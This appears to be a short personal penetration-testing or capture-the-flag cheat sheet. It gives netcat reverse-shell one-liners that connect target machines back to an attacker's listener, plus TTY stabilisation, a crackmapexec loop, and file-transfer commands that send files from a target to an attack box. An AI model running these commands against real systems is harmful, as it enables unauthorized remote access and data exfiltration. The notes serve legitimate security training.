# Misc: References, and other stuff

excellent summary of SSH tunneling [here](https://tryhackme.com/room/lateralmovementandpivoting)



## Shell catching, and stabilization

set up listener with: 
```
nc –nvlp ${LPORT} 
```

now, from our Linux target box we can do:

```
nc $LHOST $LPORT -e /bin/sh
```
or Windows:

```
nc.exe $LHOST $LPORT -e cmd.exe
```
Afterwards, stabilize with [this](https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal)

Gain TTY with `python3 -c 'import pty; pty.spawn("/bin/bash")'` or `python3 -c 'import pty; pty.spawn("/bin/sh")'`

## Revshells

[revshells.com](https://www.revshells.com/)

## Cross-compiling C on kali to windows

mingw-w64 is used to cross compile c files to windows exe files.
This can look something like:

`i686-w64-mingw32-gcc some-c-file.c -o out-file.exe -l ws2_32`

Where `-l ws2_32` tells `mingw32-gcc` to include the `ws2_32` DLL in the final executable with static linking. 


## Inline for loop

We want to execute some command for all machines in the file machines.txt. This can be done like so:
```
for machine in $(cat machines.txt); do; crackmapexec smb $machine ...; done;
```
(note, this is just an example, as crackmapexec in fact supports jut getting the machine IPs from a machines.txt file natively).


## File transfer


### From Windows Target to Attack box

If you find yourself on a windows shell and want to transfer files from the target to the attack box,
you can start an SMB server on the attackbox:

```
impacket-smbserver SHARE $(pwd) -smb2support -user ${SOME_USERNAME} -password ${SOME_PW}
```
(Note that this makes a public server. Only without setting user/password in CTF scenarios in private networks).

### SCP to copy

Assuming you have ssh started on your kali machine, we can do:

```
scp path/to/file ${USER}@${ATTACKER_IP}:/full/path/to/dest
```
or the other way:

```
scp ${USER}@${ATTACKER_IP}:/full/path/to/file path/to/dest
```

Works on modern windows boxes too.



